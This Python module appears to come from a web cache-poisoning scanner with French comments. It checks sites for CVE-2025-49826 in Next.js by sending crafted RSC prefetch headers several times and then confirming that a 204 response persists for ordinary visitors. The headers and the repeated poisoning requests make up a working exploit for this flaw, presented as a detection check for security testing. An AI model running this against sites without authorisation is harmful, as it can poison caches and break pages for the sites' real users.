#!/usr/bin/env python3
"""
https://x.com/zhero___/status/1941593504901173250
https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r
Thanks Wlayzz for the PoC !
"""

import secrets
from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
)

POISON_HEADERS = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Rsc": "1",
    "Next-Router-Prefetch": "1",
    "Next-Router-Segment-Prefetch": "/nonexistent_segment",
}

# Niveaux de confirmation
CONFIRMED    = "confirmed"
BEHAVIOR_PP  = "behavior++"
BEHAVIOR     = "behavior"


def verify_cache_poisoning(
    uri: str,
    baseline_response: requests.Response,
    poison_response: requests.Response,
    headers: dict,
    s: requests.Session,
) -> str | None:
    """
    Vérifie si le cache est effectivement empoisonné de manière persistante.

    Returns:
        "confirmed", "behavior++", "behavior", ou None
    """
    # Empoisonnement avec gestion d'erreur
    for _ in range(5):
        try:
            s.get(uri, headers=headers, verify=False,
                  allow_redirects=False, timeout=10)
        except requests.exceptions.RequestException as e:
            logger.error("poison request failed %s: %s", uri, e)
            break

    # Vérification SANS headers malveillants
    req_confirm = s.get(uri, verify=False, allow_redirects=False, timeout=10)

    # confirmed : status 204 persistant (signature exacte du CVE)
    if (
        req_confirm.status_code == 204
        and poison_response.status_code == 204
        and req_confirm.status_code != baseline_response.status_code
    ):
        return CONFIRMED

    # behavior++ : status persistant, mais pas 204
    if (
        req_confirm.status_code == poison_response.status_code
        and req_confirm.status_code != baseline_response.status_code
    ):
        return BEHAVIOR_PP

    # Pas de persistence détectable
    return None


def nextjs_204(url: str, s: requests.Session) -> bool:
    """
    Teste CVE-2025-49826 (Next.js RSC 204 cache poisoning)

    Args:
        url: URL cible
        s: Session requests

    Returns:
        True si une détection a eu lieu
    """
    try:
        # Baseline sur l'URL racine pour get_unrisk_page
        req_baseline = s.get(url, verify=False, allow_redirects=False, timeout=10)

        unrisk_page = get_unrisk_page(url, s, req_baseline)
        if not unrisk_page:
            logger.debug("no risk-free page found for %s", url)
            return False

        # Cache buster unique pour cette session de test
        uri = f"{unrisk_page}?cve={secrets.token_hex(8)}"

        # Baseline sur la page sans risque
        req = s.get(uri, verify=False, allow_redirects=False, timeout=10)

        # Requête avec headers malveillants
        req_poison = s.get(
            uri, headers=POISON_HEADERS, verify=False,
            allow_redirects=False, timeout=10,
        )

        # WAF / rate limiting → skip
        if req_poison.status_code in {403, 429}:
            return False

        if req.status_code == req_poison.status_code:
            return False

        confirmation_level = verify_cache_poisoning(
            uri, req, req_poison, POISON_HEADERS, s
        )

        if confirmation_level == CONFIRMED:
            print(
                f" {Identify.confirmed} | CVE-2025-49826"
                f" | {Colors.BLUE}{uri}{Colors.RESET}"
                f" | {req.status_code} > {req_poison.status_code} (204)"
                f" | PAYLOAD: {POISON_HEADERS}"
            )
            return True

        if confirmation_level == BEHAVIOR_PP:
            print(
                f" {Identify.behavior} ++ | CVE-2025-49826"
                f" | {Colors.BLUE}{uri}{Colors.RESET}"
                f" | {req.status_code} > {req_poison.status_code}"
                f" | PAYLOAD: {POISON_HEADERS}"
            )
            return True

    except requests.exceptions.Timeout:
        logger.error("request timeout %s", url)
    except requests.exceptions.ConnectionError as e:
        logger.error("connection error %s: %s", url, e)
    except Exception as e:
        logger.error("error testing CVE-2025-49826 %s: %s", url, e)

    return False